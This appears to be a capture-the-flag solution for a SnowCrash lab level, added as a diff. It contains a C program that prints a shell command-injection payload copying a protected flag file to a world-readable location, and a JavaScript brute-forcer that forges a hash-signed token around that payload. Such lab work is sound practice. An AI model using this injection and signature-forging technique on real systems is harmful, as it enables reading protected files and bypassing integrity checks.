@@ -1,0 +1,54 @@
+Run: 
+
+WASI_OS=linux
+WASI_ARCH=x86_64 # or 'arm64' if running on arm64 host
+WASI_VERSION=27
+WASI_VERSION_FULL=${WASI_VERSION}.0
+wget https://github.com/WebAssembly/wasi-sdk/releases/download/wasi-sdk-${WASI_VERSION}/wasi-sdk-${WASI_VERSION_FULL}-${WASI_ARCH}-${WASI_OS}.tar.gz
+tar xvf wasi-sdk-${WASI_VERSION_FULL}-${WASI_ARCH}-${WASI_OS}.tar.gz
+
+Then:
+WASI_SDK_PATH=`pwd`/wasi-sdk-${WASI_VERSION_FULL}-${WASI_ARCH}-${WASI_OS}
+CC="${WASI_SDK_PATH}/bin/clang --sysroot=${WASI_SDK_PATH}/share/wasi-sysroot"
+
+in /home/level10 :
+#include <stdio.h>
+
+int main(void) {
+	printf("v1:$(cat /home/flag10/.flag > /tmp/level10flag; chmod 777 /tmp/level10flag)9Xu:fccb6818");
+}
+
+then:
+$CC /home/level10/enzo.c -o enzo.wasm
+cp enzo.wasm /opt/snowcrash/level10/enzo.wasm
+cd /opt/snowcrash/level10/
+./enzo_runner
+cat /tmp/level10flag
+
+
+
+EXPLOIT JS:
+function hash(s) {
+  let h = 0x811c9dc5;
+  for (const ch of s) h = Math.imul(h ^ ch.charCodeAt(0), 0x01000193) >>> 0;
+  return h;
+}
+const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+const base = "$(cat /home/flag10/.flag > /tmp/level10flag; chmod 777 /tmp/level10flag)";
+
+function bruteForce(prefix) {
+  for (let len = 0; len <= 8; len++) {
+    for (let attempt = 0; attempt < 3000000; attempt++) {
+      let salt = '';
+      for (let i = 0; i < len; i++) salt += chars[Math.floor(Math.random()*chars.length)];
+      const candidate = base + salt;
+      const h = hash(candidate).toString(16).padStart(8,'0');
+      if (h.startsWith(prefix)) return { candidate, sig: h };
+    }
+  }
+  return null;
+}
+const result = bruteForce('fc');
+console.log('xs1 =', result.candidate);
+console.log('xs2 =', result.sig);
+console.log("TOKEN = v1:" + result.candidate + ":" + result.sig);
